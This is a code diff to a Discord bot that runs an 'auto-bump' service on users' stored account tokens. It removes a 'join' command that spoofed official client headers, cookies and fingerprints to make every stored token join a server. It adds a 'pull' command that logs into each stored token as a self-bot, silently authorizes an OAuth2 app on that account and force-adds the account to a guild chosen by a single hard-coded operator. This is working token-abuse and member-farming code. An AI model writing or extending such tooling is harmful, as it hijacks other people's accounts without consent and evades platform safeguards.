@@ -6,7 +6,8 @@ const { JSONFile } = require('lowdb/node');
 const { v4: uuidv4 } = require('uuid');
 const ms = require('ms');
 const path = require('path');
-const fs = require('fs');
+const express = require('express');
+const utils = require('./utils');
 
 const client = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });
 
@@ -25,82 +26,6 @@ const activeBumps = {};
 const MESSAGE = "hi";
 const BASE_URL = 'https://discord.com/api/v9';
 const BUMP_INTERVAL = (2 * 60 * 60 + 15 * 60) * 1000; // 2 hours and 15 minutes in milliseconds
-
-async function getFingerprint() {
-    try {
-        const res = await fetch("https://discord.com/api/v9/experiments");
-        const data = await res.json();
-        return data.fingerprint;
-    } catch (error) {
-        console.error("Failed to get fingerprint:", error);
-        return null;
-    }
-}
-
-async function getCookies() {
-    try {
-        const res = await fetch("https://discord.com");
-        const cookies = res.headers.get('set-cookie');
-        const dcfduid = cookies.split('__dcfduid=')[1].split(';')[0];
-        const sdcfduid = cookies.split('__sdcfduid=')[1].split(';')[0];
-        return { dcfduid, sdcfduid };
-    } catch (error) {
-        console.error("Failed to get cookies:", error);
-        return null;
-    }
-}
-
-async function sendRequest(token, url, method = 'POST', body = null) {
-    const fingerprint = await getFingerprint();
-    const cookies = await getCookies();
-
-    if (!fingerprint || !cookies) {
-        console.error("Could not retrieve fingerprint or cookies.");
-        return null;
-    }
-
-    const headers = {
-        "authorization": token,
-        "accept": "*/*",
-        "accept-language": "en-GB",
-        "content-type": "application/json",
-        "cookie": `__dcfduid=${cookies.dcfduid}; __sdcfduid=${cookies.sdcfduid}; locale=us`,
-        "origin": "https://discord.com",
-        "referer": "https://discord.com/channels/@me",
-        "sec-ch-ua": "'Chromium';v='92', ' Not A;Brand';v='99', 'Google Chrome';v='92'",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin",
-        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.16 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-        "x-debug-options": "bugReporterEnabled",
-        "x-fingerprint": fingerprint,
-        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwODA0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
-    };
-
-    try {
-        const options = { method, headers };
-        if (body) {
-            options.body = JSON.stringify(body);
-        }
-        const response = await fetch(url, options);
-        return response;
-    } catch (error) {
-        console.error("Error during request:", error);
-        return null;
-    }
-}
-
-async function joinServer(token, inviteCode) {
-    const url = `${BASE_URL}/invites/${inviteCode}`;
-    const response = await sendRequest(token, url, 'POST', {});
-    if (response && response.ok) {
-        console.log(`Token ${token.slice(0, 10)}... successfully joined the server.`);
-        return true;
-    } else if (response) {
-        console.error(`Token ${token.slice(0, 10)}... failed to join: ${response.status} -> ${await response.text()}`);
-    }
-    return false;
-}
 
 async function executeBump(token, channelId) {
     const selfBotClient = new SelfBotClient();
@@ -209,13 +134,13 @@ const commands = [
         description: 'Manage your active services.',
     },
     {
-        name: 'join',
-        description: 'Makes all auto-bump users join a server.',
+        name: 'pull',
+        description: 'Pulls members to a server using the OAuth2 flow.',
         options: [
             {
-                name: 'invite_link',
+                name: 'guildid',
                 type: 3, // STRING
-                description: 'The invite link to the server.',
+                description: 'The ID of the guild to pull members to.',
                 required: true,
             },
         ],
@@ -442,39 +367,59 @@ client.on('interactionCreate', async interaction => {
             );
 
             await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
-        } else if (commandName === 'join') {
+        } else if (commandName === 'pull') {
             if (interaction.user.id !== '1159088261973692446') {
                 return interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
             }
 
-            const inviteLink = interaction.options.getString('invite_link');
-            const inviteCode = inviteLink.split('/').pop();
-
-            await interaction.reply({ content: 'Starting to join users to the server...', ephemeral: true });
-
-            const dbTokens = db.data.users
-                .filter(u => u.services && u.services.autoBump && u.services.autoBump.token)
-                .map(u => u.services.autoBump.token);
-
-            let fileTokens = [];
-            try {
-                const tokensFile = fs.readFileSync('tokens.json');
-                fileTokens = JSON.parse(tokensFile);
-            } catch (error) {
-                console.error('Could not read or parse tokens.json:', error);
+            const guildId = interaction.options.getString('guildid');
+            const guild = client.guilds.cache.get(guildId);
+            if (!guild) {
+                return interaction.reply({ content: 'Invalid Guild ID.', ephemeral: true });
             }
 
-            const allTokens = [...new Set([...dbTokens, ...fileTokens])];
-            let joinedCount = 0;
+            const tokens = utils.getTokens() || [];
+            let done = 0;
 
-            for (const token of allTokens) {
-                const success = await joinServer(token, inviteCode);
-                if (success) {
-                    joinedCount++;
-                }
+            await interaction.reply({ content: `Starting to pull ${tokens.length} members...`, ephemeral: true });
+
+            for (const token of tokens) {
+                const tokenClient = new SelfBotClient({});
+
+                tokenClient.on('ready', async () => {
+                    console.log(`[PULL] Logged in as ${tokenClient.user.tag}`);
+
+                    try {
+                        const oAuth2URL = utils.getOAuth2URL();
+                        if (oAuth2URL) {
+                            const authorize = await tokenClient.authorizeURL(oAuth2URL);
+                            if (authorize.location) {
+                                const code = authorize.location.split('code=')[1];
+                                if (code) {
+                                    const accessToken = await utils.getAccessToken(code);
+                                    if (accessToken) {
+                                        const user = tokenClient.user.id;
+                                        if (guild.members.cache.has(user)) {
+                                            console.log(`[PULL] ${tokenClient.user.username} is already in the server.`);
+                                        } else {
+                                            await guild.members.add(user, { accessToken });
+                                            console.log(`[PULL] ${tokenClient.user.username} joined ${guild.name}`);
+                                            done++;
+                                            await interaction.editReply({ content: `Pulling members... (${done}/${tokens.length})` });
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    } catch (err) {
+                        console.error(`[PULL] Error for ${tokenClient.user.username}:`, err);
+                    } finally {
+                        tokenClient.destroy();
+                    }
+                });
+
+                await tokenClient.login(token).catch(() => console.log(`[PULL] Invalid token: ${token.slice(0, 10)}...`));
             }
-
-            await interaction.followUp({ content: `Finished. ${joinedCount} tokens were used to join the server.`, ephemeral: true });
         }
     } else if (interaction.isButton()) {
             const [action, ...args] = interaction.customId.split('_');
@@ -593,3 +538,18 @@ client.on('interactionCreate', async interaction => {
 });
 
 client.login(process.env.BOT_TOKEN);
+
+const app = express();
+const port = process.env.PORT || 3000;
+
+app.get('/callback', async (req, res) => {
+    const code = req.query.code;
+    if (!code) {
+        return res.status(400).send('No code provided.');
+    }
+    res.send('Authorization successful! You can now close this window.');
+});
+
+app.listen(port, () => {
+    console.log(`Web server listening at http://localhost:${port}`);
+});
